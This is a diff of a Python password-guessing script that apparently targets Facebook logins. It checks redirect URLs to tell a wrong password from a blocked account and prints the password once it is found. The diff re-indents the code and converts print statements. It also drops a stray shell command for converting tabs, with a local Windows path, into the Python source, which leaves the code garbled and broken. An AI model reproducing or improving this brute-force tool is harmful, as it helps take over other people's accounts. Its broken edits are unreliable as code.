@@ -68,21 +68,20 @@ def attack(password,e,las):
             log = br.geturl()
             print("[*] user name ",e+p+las)
                      print("[*] user password ", e+p+las)
-             print(log[25:27])
-             if log[25:27] == 'lo':
-            print("wrong password")	
-                     elif log[25:27] == 'ch':
-            print("Blocked account")
-             else:
-            
-            print("\n\n\n [*] Password found .. !!")
-            print("\n [*] Password : %s\n" % e+str(password)+las)
-			sys.exit(1)
+            print(log[25:27])
+            if log[25:27] == 'lo':
+                print("wrong password")	
+            elif log[25:27] == 'ch':
+                print("Blocked account")
+            else:
+                print("\n\n\n [*] Password found .. !!")
+                print("\n [*] Password : %s\n" % e+str(password)+las)
+                sys.exit(1)
 			
 		     c +=1
-	 	except KeyboardInterrupt:
-		    print "\n[*] Exiting program .. "
-		    sys.exit(1)
+        except KeyboardInterrupt:
+            print("\n[*] Exiting program .. ")
+            sys.exit(1)
 	        except TypeError:
   		    password +=1
                     re_check(password)
@@ -91,7 +90,11 @@ def attack(password,e,las):
 		    if int(e.code) == 500:
 			# do nothing. Maybe you need to set "html" to empy string.
 			pass
-		    else:
+		                
+            # Convert tabs to spaces in the file
+            
+            python -c "import sys; content = open(sys.argv[1]).read(); open(sys.argv[1], 'w').write(content.expandtabs(4))" "c:\Users\Tudor Condo Trust\Desktop\Test\test-1\facebook_multicheck.py"
+            else:
 			pass
 
 
